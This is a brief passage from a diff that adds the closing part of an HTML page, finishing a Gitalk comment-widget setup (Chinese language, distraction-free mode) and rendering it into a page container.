+      id          : '95bd49d5230032d5ded882801f24bcab',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
